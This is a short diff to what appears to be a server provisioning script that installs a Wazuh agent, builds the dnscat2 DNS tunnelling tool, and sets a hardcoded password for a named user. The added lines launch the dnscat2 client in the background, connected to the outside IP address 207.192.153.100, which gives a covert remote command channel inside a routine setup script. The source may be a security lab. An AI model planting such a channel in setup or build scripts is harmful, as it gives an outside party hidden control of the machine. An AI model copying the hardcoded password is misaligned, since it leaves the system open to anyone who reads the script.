@@ -44,6 +44,8 @@ apt-get update && apt-get install wazuh-agent -y
 git clone https://github.com/iagox86/dnscat2.git
 cd dnscat2/client/
 make
+## -- start dsncat2 client
+/dnscat2/client/dnscat --dns server=207.192.153.100 &
 ## --verify password for Sys Admin
 echo "Vanessa_Cohen:Y71N1" | chpasswd
 # --signals completion
